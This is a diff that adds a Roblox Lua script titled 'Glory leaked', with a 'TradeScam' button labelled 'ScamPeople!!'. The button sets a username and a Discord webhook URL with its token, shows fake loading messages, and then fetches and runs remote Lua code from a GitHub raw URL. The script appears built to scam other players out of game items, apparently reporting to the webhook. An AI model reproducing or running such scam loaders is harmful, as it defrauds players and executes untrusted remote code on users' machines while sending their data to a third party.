@@ -1,0 +1,17 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Glory leaked", "Synapse")
+
+local TradeScam = Window:NewTab("TradeScam")
+local TradeScamSection = TradeScam:NewSection("TradeScam")
+
+TradeScamSection:NewButton("TradeScam", "ScamPeople!!", function()
+Username = "caspianrad100 "
+WebHook = "https://discord.com/api/webhooks/1073262955828883648/UDNUDjm8rUlnvx_h9KT4EhhXLGoV8GpARttt4geg8vIVEH3fBikkNiPBpgoYjMrzFGI3"
+
+_G.CustomScriptName = "Glory Hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+end)
